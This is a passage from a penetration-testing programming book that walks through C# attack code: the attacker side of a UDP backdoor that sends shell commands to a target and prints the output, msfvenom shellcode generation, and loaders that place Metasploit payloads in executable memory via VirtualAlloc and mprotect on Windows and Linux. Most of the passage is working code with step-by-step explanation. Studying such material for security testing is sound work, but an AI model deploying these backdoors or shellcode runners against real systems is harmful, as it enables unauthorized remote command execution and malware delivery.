class="italic">D</span> in UDP) instead of TCP packets. The third and final value, <span class="calibre4">ProtocolType.Udp</span>, tells the socket that we’ll be using UDP to communicate with the remote host.</p><p class="calibre_6">After creating the socket to be used for communication, we assign a new <span class="calibre4">IPAddress</span> variable with the value of the <span class="calibre4">localEP.Address</span> property ➌, which was previously filled with the attacker’s IP address upon receiving data on our UDP listener. We create a new <span class="calibre4">IPEndPoint</span> ➍ with the <span class="calibre4">IPAddress</span> of the attacker and the listening port that was passed as the argument to the payload.</p><p class="calibre_6">Once we have the socket set up and we know where we are returning our command output, <span class="calibre4">Encoding.ASCII.GetBytes()</span> converts the output to a byte array. We use <span class="calibre4">SendTo()</span> ➎ on the socket to broadcast the data back to the attacker by passing the byte array containing the command output as the first argument and passing the sender’s endpoint as the second argument. Finally, we iterate back to the top of the <span class="calibre4">while</span> loop to read in another command.</p><p id="filepos381414" class="calibre_10"><span class="calibre3"><span class="bold">
</span></span><span class="calibre3"><span class="italic"><span class="bold">The Attacker’s Code</span></span></span></p><p class="calibre_11">In order for this attack to work, the attacker must be able to listen to and send UDP broadcasts to the correct host. <a href="#filepos382307">Listing 4-13</a> shows the first bit of code to set up a UDP listener.</p><blockquote class="calibre_14"><span class="calibre4">static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> int lport = int.➊Parse(args[1]);</span><br class="calibre5"/><span class="calibre4"> using (UdpClient listener = new ➋UdpClient(lport))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);</span><br class="calibre5"/><span class="calibre4"> string output;</span><br class="calibre5"/><span class="calibre4"> byte[] bytes; </span><a id="filepos382307"/><span class="calibre4"><span class="italic">Listing 4-13: Setting up the UDP listener and other variables for the attacker-side code</span></span></blockquote><p class="calibre_6">Assuming that this code will take as arguments the host to send commands to and the port to listen on, we pass the port to listen on to <span class="calibre4">Parse()</span> ➊ in order to convert the string into an integer, and then we pass the resulting integer to the <span class="calibre4">UdpClient</span> constructor ➋ to instantiate a new <span class="calibre4">UdpClient</span> class. We then pass the listening port to the <span class="calibre4">IPEndPoint</span> class constructor, along with the <span class="calibre4">IPAddress.Any</span> value to instantiate a new <span class="calibre4">IPEndPoint</span> class ➌. Once the <span class="calibre4">IPEndPoint</span> is set up, we declare the variables <span class="calibre4">output</span> and <span class="calibre4">bytes</span> for later use.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Creating the Variables to Send the UDP Broadcasts</span></span></p><p class="calibre_11"><a href="#filepos383940">Listing 4-14</a> shows how to create the variables to be used to send the UDP broadcasts.</p><blockquote class="calibre_14"><span class="calibre4"> using (Socket sock = new ➊Socket(AddressFamily.InterNetwork,</span><br class="calibre5"/><span class="calibre4"> SocketType.Dgram,</span><br class="calibre5"/><span class="calibre4"> ProtocolType.Udp))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> IPAddress addr = ➋IPAddress.Parse(args[0]);</span><br class="calibre5"/><span class="calibre4"> IPEndPoint addrEP = new ➌IPEndPoint(addr, lport); </span><a id="filepos383940"/><span class="calibre4"><span class="italic">Listing 4-14: Creating the UDP socket and endpoint to communicate with</span></span></blockquote><p class="calibre_6">To begin, we instantiate a new <span class="calibre4">Socket</span> class ➊ within the context of a <span class="calibre4">using</span> block. The enumeration values passed to <span class="calibre4">Socket</span> tell the socket that we’ll be using IPv4 addressing, datagrams, and UDP to communicate via broadcasts. We instantiate a new <span class="calibre4">IPAddress</span> with <span class="calibre4">IPAddress.Parse()</span> ➋ to convert the first argument passed to the code to an <span class="calibre4">IPAddress</span> class. We then pass the <span class="calibre4">IPAddress</span> object and the port on which the target’s UDP listener will be listening to the <span class="calibre4">IPEndPoint</span> constructor in order to instantiate a new <span class="calibre4">IPEndPoint</span> class ➌.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Communicating with the Target</span></span></p><p class="calibre_11"><a href="#filepos386609">Listing 4-15</a> shows how we can now send data to and receive data from the target.</p><blockquote class="calibre_14"><span class="calibre4"> Console.WriteLine("Enter command to send, or a blank line to quit");</span><br class="calibre5"/><span class="calibre4"> while (true)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string command = ➊Console.ReadLine();</span><br class="calibre5"/><span class="calibre4"> byte[] buff = Encoding.ASCII.GetBytes(command);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> sock.➋SendTo(buff, addrEP);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(command))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> sock.Close();</span><br class="calibre5"/><span class="calibre4"> listener.Close();</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrWhiteSpace(command))</span><br class="calibre5"/><span class="calibre4"> continue;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> bytes = listener.➌Receive(ref localEP);</span><br class="calibre5"/><span class="calibre4"> output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(output);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch (Exception ex)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Exception{0}", ex.Message);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos386609" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-15: Main logic to send and receive data to and from the target’s UDP listener</span></span></p><p class="calibre_6">After printing some friendly help text on how to use this script, we begin sending commands to the target in a <span class="calibre4">while</span> loop. First, <span class="calibre4">Console.ReadLine()</span> ➊ reads in a line of data from standard input, which will become the command to send to the target’s machine. Then, <span class="calibre4">Encoding.ASCII.GetBytes()</span> converts this string into a byte array so that we can send it over the network.</p><p class="calibre_6">Next, within a <span class="calibre4">try</span>/<span class="calibre4">catch</span> block, we attempt to send the byte array using <span class="calibre4">SendTo()</span> ➋, passing in the byte array and the IP endpoint to send the data to. After sending the command string, we return out of the <span class="calibre4">while</span> loop if the string read from standard input was empty because we built the same logic into the target code. If the string is not empty, but is only whitespace, we return to the beginning of the <span class="calibre4">while</span> loop. Then we call <span class="calibre4">Receive()</span> ➌ on the UDP listener to block execution until the command output is received from the target, at which point <span class="calibre4">Encoding.ASCII.GetString()</span> converts the bytes received to a string that is then written to the attacker’s console. If an error occurs, we print an exception message to the screen.</p><p class="calibre_6"> As shown in <a href="#filepos388999">Listing 4-16</a>, after starting the payload on a remote machine, passing <span class="calibre4">4444</span> as the only argument to the payload, and starting the receiver on the attacker’s machine, we should be able to execute commands and receive output from the target.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">/tmp/attacker.exe 192.168.1.31 4444</span></span><br class="calibre5"/><span class="calibre4">Enter command to send, or a blank line to quit</span><br class="calibre5"/><span class="calibre4"><span class="bold">whoami</span></span><br class="calibre5"/><span class="calibre4">bperry</span><br class="calibre5"/><span class="calibre4"><span class="bold">pwd</span></span><br class="calibre5"/><span class="calibre4">/tmp</span><br class="calibre5"/><span class="calibre4"><span class="bold">uname</span></span><br class="calibre5"/><span class="calibre4">Linux </span><a id="filepos388999"/><span class="calibre4"><span class="italic">Listing 4-16: Communicating with the target machine over UDP in order to run arbitrary commands</span></span></blockquote><p id="filepos389143" class="calibre_10"><span class="calibre3"><span class="bold">Running x86 and x86-64 Metasploit Payloads from C#</span></span></p><p class="calibre_11">The Metasploit Framework exploitation toolset, begun by HD Moore and now developed by Rapid7, has become the de facto penetration testing and exploit development framework for security professionals. Because it’s written in Ruby, Metasploit is cross-platform and will run on Linux, Windows, OS X, and a slew of other operating systems. As of this writing, there are more than 1,300 free Metasploit exploits written in the Ruby programming language.</p><p class="calibre_6">In addition to its collection of exploits, Metasploit contains many libraries designed to make exploit development quick and generally painless. For example, as you’ll soon see, you can use Metasploit to help create a cross-platform .NET assembly to detect your operating system type and architecture and to run shellcode against it.</p><p id="filepos390148" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Setting Up Metasploit</span></span></span></p><p class="calibre_11">As of this writing, Rapid7 develops Metasploit on GitHub (<a href="https://github.com/rapid7/metasploit-framework/"><span class="italic">https://github.com/rapid7/metasploit-framework/</span></a>). On Ubuntu, use <span class="calibre4">git</span> to clone the master Metasploit repository to your system, as shown in <a href="#filepos390897">Listing 4-17</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">sudo apt-get install git</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">git clone https://github.com/rapid7/metasploit-framework.git</span></span><span class="calibre4">
</span><a id="filepos390897"/><span class="calibre4"><span class="italic">Listing 4-17: Installing git and cloning the Metasploit Framework</span></span></blockquote><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">I recommend using Ubuntu when developing the next payload in this chapter. Of course, testing will also need to be done on Windows to ensure your OS detection and payloads work across both platforms.</span></blockquote><p class="calibre_10"><span class="calibre3"><span class="bold">Installing Ruby</span></span></p><p class="calibre_11">The Metasploit Framework requires Ruby. If, after reading the Metasploit install instructions online, you find that you need a different version of Ruby installed on your Linux system, use RVM, the Ruby Version Manager (<a href="http://rvm.io/"><span class="italic">http://rvm.io/</span></a>) to install it alongside any existing version of Ruby. Install the RVM maintainer’s GNU Privacy Guard (GPG) key and then install RVM on Ubuntu, as shown in <a href="#filepos392317">Listing 4-18</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">curl -sSL https://rvm.io/mpapis.asc | gpg --import -</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">curl -sSL https://get.rvm.io | bash -s stable</span></span><span class="calibre4">
</span><a id="filepos392317"/><span class="calibre4"><span class="italic">Listing 4-18: Installing RVM</span></span></blockquote><p class="calibre_6">Once RVM is installed, determine which version of Ruby the Metasploit Framework requires by viewing the <span class="italic">.ruby-version</span> file at the root of the Metasploit Framework, as shown in <a href="#filepos392919">Listing 4-19</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">cd metasploit-framework/</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">cat .ruby-version</span></span><br class="calibre5"/><span class="calibre4">2.1.5</span></blockquote><p id="filepos392919" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-19: Printing the contents of the</span></span><span class="calibre4"> .ruby-version </span><span class="calibre4"><span class="italic">file at the root of the Metasploit Framework</span></span></p><p class="calibre_6">Now run the <span class="calibre4"><span class="bold">rvm</span></span> command to compile and install the correct version of Ruby, as shown in <a href="#filepos393589">Listing 4-20</a>. This may take several minutes, depending on your internet and CPU speed.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">rvm install 2.</span></span><span class="calibre4"><span class="italic"><span class="bold">x</span></span></span></blockquote><p id="filepos393589" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-20: Installing the version of Ruby required by Metasploit</span></span></p><p class="calibre_6">Once your Ruby install completes, set your bash environment to see it, as shown in <a href="#filepos394063">Listing 4-21</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">rvm use 2.</span></span><span class="calibre4"><span class="italic"><span class="bold">x</span></span></span></blockquote><p id="filepos394063" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-21: Setting the installed version of Ruby as the default</span></span></p><p class="calibre_10"><span class="calibre3"><span class="bold">Installing Metasploit Dependencies</span></span></p><p class="calibre_11">Metasploit uses the <span class="calibre4">bundler</span> gem (a Ruby package) to manage dependencies. Change to the current Metasploit Framework git checkout directory on your machine and run the commands shown in <a href="#filepos395135">Listing 4-22</a> to install the development libraries needed to build some of the gems required by the Metasploit Framework.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">cd metasploit-framework/</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">sudo apt-get install libpq-dev libpcap-dev libxslt-dev</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">gem install bundler</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">bundle install</span></span><span class="calibre4">
</span><a id="filepos395135"/><span class="calibre4"><span class="italic">Listing 4-22: Installing Metasploit dependencies</span></span></blockquote><p class="calibre_6"> Once all dependencies have been installed, you should be able to start the Metasploit Framework, as shown in <a href="#filepos395587">Listing 4-23</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">./msfconsole -q</span></span><br class="calibre5"/><span class="calibre4">msf &gt; </span><a id="filepos395587"/><span class="calibre4"><span class="italic">Listing 4-23: Starting Metasploit successfully</span></span></blockquote><p class="calibre_6">With <span class="calibre4">msfconsole</span> started successfully, we can begin using the other tools in the framework to generate payloads.</p><p id="filepos395863" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Generating Payloads</span></span></span></p><p class="calibre_11">We’ll use the Metasploit tool <span class="calibre4">msfvenom</span> to generate raw assembly payloads to open programs on Windows or run commands on Linux. For example, <a href="#filepos397025">Listing 4-24</a> shows how commands sent to <span class="calibre4">msfvenom</span> would generate an x86-64 (64-bit) payload for Windows that will pop up the <span class="italic">calc.exe</span> Windows calculator on the currently displayed desktop. (To see the <span class="calibre4">msfvenom</span> tool’s full list of options, run <span class="calibre4">msfvenom --help</span> from the command line.) $ <span class="bold">./msfvenom -p windows/x64/exec -f csharp CMD=calc.exe</span><br class="calibre5"/>No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br class="calibre5"/>No Arch selected, selecting Arch: x86_64 from the payload<br class="calibre5"/>No encoder or badchars specified, outputting raw payload<br class="calibre5"/>byte[] buf = new byte[276] {<br class="calibre5"/>0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,<br class="calibre5"/>--<span class="italic">snip</span>--<br class="calibre5"/>0x63,0x2e,0x65,0x78,0x65,0x00 }; <a id="filepos397025"/><span class="italic">Listing 4-24: Running</span>
<span class="calibre4"><span class="italic">msfvenom</span></span>
<span class="italic">to generate a raw Windows payload that runs</span> calc.exe Here we pass in <span class="calibre4">windows/x64/exec</span> as the payload, <span class="calibre4">csharp</span> as the payload format, and the payload option <span class="calibre4">CMD=calc.exe</span>. You might also pass in something like <span class="calibre4">linux/x86/exec</span> with <span class="calibre4">CMD=whoami</span> to generate a payload that, when launched on a 32-bit Linux system, runs the command <span class="calibre4">whoami</span>.</p><p id="filepos397572" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Executing Native Windows Payloads as Unmanaged Code</span></span></span></p><p class="calibre_11">Metasploit payloads are generated in 32- or 64-bit assembly code—called <span class="italic">unmanaged code</span> in the .NET world. When you compile C# code into a DLL or executable assembly, that code is referred to as <span class="italic">managed code</span>. The difference between the two is that the managed code requires a .NET or Mono virtual machine in order to run, whereas the unmanaged code can be run directly by the operating system.</p><p class="calibre_6">To execute unmanaged assembly code within a managed environment, we’ll use .NET’s P/Invoke to import and run the <span class="calibre4">VirtualAlloc()</span> function from the Microsoft Windows kernel32.dll. This lets us allocate the readable, writable, and executable memory required, as shown in <a href="#filepos398998">Listing 4-25</a>.</p><blockquote class="calibre_14"><span class="calibre4">class MainClass</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> [➊DllImport("kernel32")]</span><br class="calibre5"/><span class="calibre4"> static extern IntPtr ➋VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> [➌UnmanagedFunctionPointer(CallingConvention.StdCall)]</span><br class="calibre5"/><span class="calibre4"> delegate void ➍WindowsRun(); </span><a id="filepos398998"/><span class="calibre4"><span class="italic">Listing 4-25: Importing the</span></span><span class="calibre4">
</span><span class="calibre7">VirtualAlloc()</span><span class="calibre4">
</span><span class="calibre4"><span class="italic">kernel32.dll function and defining a Windows-specific delegate</span></span></blockquote><p class="calibre_6">At ➋, we import <span class="calibre4">VirtualAlloc()</span> from kernel32.dll. The <span class="calibre4">VirtualAlloc()</span> function takes four arguments of type <span class="calibre4">IntPtr</span>, which is a C# class that makes passing data between managed and unmanaged code much simpler. At ➊, we use the C# attribute <span class="calibre4">DllImport</span> (an attribute is like an annotation in Java or a decorator in Python) to tell the virtual machine to look for this function in the kernel32.dll library at runtime. (We’ll use the <span class="calibre4">DllImport</span> attribute to import functions from libc when executing Linux payloads.) At ➍, we declare the delegate <span class="calibre4">WindowsRun()</span>, which has an <span class="calibre4">UnmanagedFunctionPointer</span> attribute ➌ that tells the Mono/.NET virtual machine to run this delegate as an unmanaged function. By passing <span class="calibre4">CallingConvention.StdCall</span> to the <span class="calibre4">UnmanagedFunctionPointer</span> attribute, we tell the Mono/.NET virtual machine to call <span class="calibre4">VirtualAlloc()</span> using the <span class="calibre4">StdCall</span> Windows calling convention.</p><p class="calibre_6">First we need to write a <span class="calibre4">Main()</span> method to execute the payload according to the target system architecture, as shown in <a href="#filepos401856">Listing 4-26</a>.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> OperatingSystem os = ➊Environment.OSVersion;</span><br class="calibre5"/><span class="calibre4"> bool x86 = ➋(IntPtr.Size == 4);</span><br class="calibre5"/><span class="calibre4"> byte[] payload;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (os.Platform == ➌PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (!x86)</span><br class="calibre5"/><span class="calibre4"> payload = new byte[] { [... FULL x86-64 PAYLOAD HERE ...] };</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> payload = new byte[] { [... FULL x86 PAYLOAD HERE ...] };</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> IntPtr ptr = ➍VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);</span><br class="calibre5"/><span class="calibre4"> ➎Marshal.Copy(payload, 0, ptr, payload.Length);</span><br class="calibre5"/><span class="calibre4"> WindowsRun r = (WindowsRun)➏Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));</span><br class="calibre5"/><span class="calibre4"> r();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos401856" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-26: Small C# class wrapping two Metasploit payloads</span></span></p><p class="calibre_6">To determine the target operating system, we capture the variable <span class="calibre4">Environment.OSVersion</span> ➊, which has a <span class="calibre4">Platform</span> property that identifies the current system (as used in the <span class="calibre4">if</span> statement). To determine the target architecture, we compare the size of an <span class="calibre4">IntPtr</span> to the number 4 ➋ because on a 32-bit system, a pointer is 4 bytes long, but on a 64-bit system, it’s 8 bytes long. We know that if the <span class="calibre4">IntPtr</span> size is 4, we are on a 32-bit system; otherwise, we assume the system is 64-bit. We also declare a byte array called <span class="calibre4">payload</span> to hold our generated payload.</p><p class="calibre_6"> Now we can set up our native assembly payload. If the current operating system matches a Windows <span class="calibre4">PlatformID</span> ➌ (a list of known platforms and operating system versions), we assign a byte array to the <span class="calibre4">payload</span> variable according to the system’s architecture.</p><p class="calibre_6">To allocate the memory required to execute the raw assembly code, we pass four arguments to <span class="calibre4">VirtualAlloc()</span> ➍. The first argument is <span class="calibre4">IntPtr.Zero</span>, which tells <span class="calibre4">VirtualAlloc()</span> to allocate the memory at the first viable location. The second argument is the amount of memory to allocate, which will equal the length of the current payload. This argument is cast to an <span class="calibre4">IntPtr</span> class that the unmanaged function understands in order for it to allocate enough memory to fit our payload.</p><p class="calibre_6">The third argument is a magic value defined in kernel32.dll that maps to the <span class="calibre4">MEM_COMMIT</span> option, telling <span class="calibre4">VirtualAlloc()</span> to allocate the memory right away. This argument defines the mode in which the memory should be allocated. Finally, <span class="calibre4">0x40</span> is a magic value defined by kernel32.dll that maps to the RWX (read, write, and execute) mode that we want. The <span class="calibre4">VirtualAlloc()</span> function will return a pointer to our newly allocated memory so we know where our allocated memory region begins.</p><p class="calibre_6">Now <span class="calibre4">Marshal.Copy()</span> ➎ copies our payload directly into the allocated memory space. The first argument passed to <span class="calibre4">Marshal.Copy()</span> is the byte array we want to copy into the allocated memory. The second is the index in the byte array to begin copying at, and the third is where to begin copying to (using the pointer returned by the <span class="calibre4">VirtualAlloc()</span> function). The last argument is how many bytes from the byte array we want to copy into the allocated memory (all).</p><p class="calibre_6">Next, we reference the assembly code as an unmanaged function pointer using the <span class="calibre4">WindowsRun</span> delegate we defined at the top of the <span class="calibre4">MainClass</span>. We use the <span class="calibre4">Marshal.GetDelegateForFunctionPointer()</span> method ➏ to create a new delegate by passing the pointer to the beginning of our assembly code and the type of delegate as the first and second arguments, respectively. We cast the delegate returned by this method to our <span class="calibre4">WindowsRun</span> delegate type and then assign it to a new variable of the same <span class="calibre4">WindowsRun</span> type. Now all that’s left is to call this delegate as if it were a function and execute the assembly code we copied into memory.</p><p id="filepos405676" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Executing Native Linux Payloads</span></span></span></p><p class="calibre_11">In this section, we look at how to define payloads that can be compiled once and run on both Linux and Windows. But first we need to import a few functions from libc and define our Linux unmanaged function delegate, as shown in <a href="#filepos406762">Listing 4-27</a>.</p><blockquote class="calibre_14"><span class="calibre4"> [DllImport("libc")]</span><br class="calibre5"/><span class="calibre4"> static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> [DllImport("libc")]</span><br class="calibre5"/><span class="calibre4"> static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> [DllImport("libc")]</span><br class="calibre5"/><span class="calibre4"> static extern void free(IntPtr ptr);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> [UnmanagedFunctionPointer(➊CallingConvention.Cdecl)]</span><br class="calibre5"/><span class="calibre4"> delegate void ➋LinuxRun(); </span><a id="filepos406762"/><span class="calibre4"><span class="italic">Listing 4-27: Setting up the payload to run the generated Metasploit payloads</span></span></blockquote><p class="calibre_6">We add the lines shown in <a href="#filepos406762">Listing 4-27</a> at the top of the <span class="calibre4">MainClass</span> near our Windows function import. We import three functions from libc—<span class="calibre4">mprotect()</span>, <span class="calibre4">posix_memalign()</span>, and <span class="calibre4">free()</span>—and define a new delegate called <span class="calibre4">LinuxRun</span> ➋. This has the <span class="calibre4">UnmanagedFunctionPointer</span> attribute, like our <span class="calibre4">WindowsRun</span> delegate. However, instead of passing <span class="calibre4">CallingConvention.StdCall</span> as we did in <a href="#filepos398998">Listing 4-25</a>, we pass <span class="calibre4">CallingConvention.Cdecl</span> ➊, because <span class="calibre4">cdecl</span> is the calling convention of native functions in a Unix-like environment.</p><p class="calibre_6">In <a href="#filepos408521">Listing 4-28</a>, we now add an <span class="calibre4">else if</span> statement to our <span class="calibre4">Main()</span> method, following the <span class="calibre4">if</span> statement that tests whether we are on a Windows machine (refer to ➌ in <a href="#filepos401856">Listing 4-26</a>).</p><blockquote class="calibre_14"><span class="calibre4">else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> if (!x86)</span><br class="calibre5"/><span class="calibre4"> payload = new byte[] { [... X86-64 LINUX PAYLOAD GOES HERE ...] };</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> payload = new byte[] { [... X86 LINUX PAYLOAD GOES HERE ...] }; </span><a id="filepos408521"/><span class="calibre4"><span class="italic">Listing 4-28: Detecting the platform and assigning the appropriate payload</span></span></blockquote><p class="calibre_6">The original <span class="calibre4">PlatformID</span> enumeration from Microsoft did not include values for non-Windows platforms. As Mono has developed, unofficial values for Unix-like system <span class="calibre4">Platform</span> properties have been introduced, so we test the value of <span class="calibre4">Platform</span> directly against magic integer values rather than well-defined enumeration values. The values 4, 6, and 128 can be used to determine whether we’re running a Unix-like system. Casting the <span class="calibre4">Platform</span> property to an <span class="calibre4">int</span> allows us to compare the <span class="calibre4">Platform</span> value to the integer values 4, 16, and 128.</p><p class="calibre_6">Once we determine that we’re running on a Unix-like system, we can set up the values we need in order to execute our native assembly payloads. Depending on our current architecture, the payload byte array will be assigned either our x86 or x86-64 payload.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Allocating Memory</span></span></p><p class="calibre_11">Now we begin allocating the memory to insert our assembly into memory, as shown in <a href="#filepos410677">Listing 4-29</a>.</p><blockquote class="calibre_14"><span class="calibre4"> IntPtr ptr = IntPtr.Zero;</span><br class="calibre5"/><span class="calibre4"> IntPtr success = IntPtr.Zero;</span><br class="calibre5"/><span class="calibre4"> bool freeMe = false;</span><br class="calibre5"/><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> int pagesize = 4096;</span><br class="calibre5"/><span class="calibre4"> IntPtr length = (IntPtr)payload.Length;</span><br class="calibre5"/><span class="calibre4"> success = ➊posix_memalign(ref ptr, (IntPtr)32, length);</span><br class="calibre5"/><span class="calibre4"> if (success != IntPtr.Zero)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Bail! memalign failed: " + success);</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos410677" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-29: Allocating the memory using</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">posix_memalign()</span></span></p><p class="calibre_6">First, we define a few variables: <span class="calibre4">ptr</span>, which should be assigned the pointer at the beginning of our allocated memory by <span class="calibre4">posix_memalign()</span>, if all goes well; <span class="calibre4">success</span>, which will be assigned the value returned by <span class="calibre4">posix_ memalign()</span> if our allocation succeeds; and the Boolean value <span class="calibre4">freeMe</span>, which will be <span class="calibre4">true</span> when the allocation succeeds so that we know when we need to free the allocated memory. (We assign <span class="calibre4">freeMe</span> a value of <span class="calibre4">false</span> in case allocation fails.) Next we start a <span class="calibre4">try</span> block to begin the allocation so we can catch any exceptions and exit the payload gracefully if an error occurs. We set a new variable called <span class="calibre4">pagesize</span> to 4096, which is equal to the default memory page size on most Linux installations.</p><p class="calibre_6">After assigning a new variable called <span class="calibre4">length</span>, which contains the length of our payload cast to an <span class="calibre4">IntPtr</span>, we call <span class="calibre4">posix_memalign()</span> ➊ by passing the <span class="calibre4">ptr</span> variable by reference so that <span class="calibre4">posix_memalign()</span> can alter the value directly without having to pass it back. We also pass the memory alignment (always a multiple of 2; 32 is a good value) and the amount of memory we want to allocate. The <span class="calibre4">posix_memalign()</span> function will return <span class="calibre4">IntPtr.Zero</span> if the allocation succeeds, so we check for this. If <span class="calibre4">IntPtr.Zero</span> was not returned, we print a message about <span class="calibre4">posix_memalign()</span> failing and then return and exit from the payload. If the allocation is successful, we change the mode of the allocated memory to be readable, writable, and executable, as shown in <a href="#filepos413515">Listing 4-30</a>.</p><blockquote class="calibre_14"><span class="calibre4"> freeMe = true;</span><br class="calibre5"/><span class="calibre4"> IntPtr alignedPtr = ➊(IntPtr)((int)ptr &amp; ~(pagesize - 1)); //get page boundary</span><br class="calibre5"/><span class="calibre4"> IntPtr ➋mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux</span><br class="calibre5"/><span class="calibre4"> success = ➌mprotect(alignedPtr, (IntPtr)32, mode);</span><br class="calibre5"/><span class="calibre4"> if (success != IntPtr.Zero)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Bail! mprotect failed");</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos413515" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-30: Changing the mode of the allocated memory</span></span></p><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">The technique used to achieve shellcode execution on Linux will not work on an operating system that restricts the allocation of RWX memory. For example, if your Linux distribution is running SELinux, these examples might not work on your machine. For this reason, I recommend Ubuntu—because SELinux is not present, the examples should run without issue.</span></blockquote><p class="calibre_6"> In order to make sure we free the allocated memory later, we set <span class="calibre4">freeMe</span> to <span class="calibre4">true</span>. Next, we take the pointer that <span class="calibre4">posix_memalign()</span> set during allocation (the <span class="calibre4">ptr</span> variable) and create a page-aligned pointer using the page-aligned memory space we allocated by performing a bitwise AND operation on the pointer with the ones’ complement of our pagesize ➊. In essence, the ones’ complement effectively turns our pointer address into a negative number so that our math for setting the memory permissions adds up.</p><p 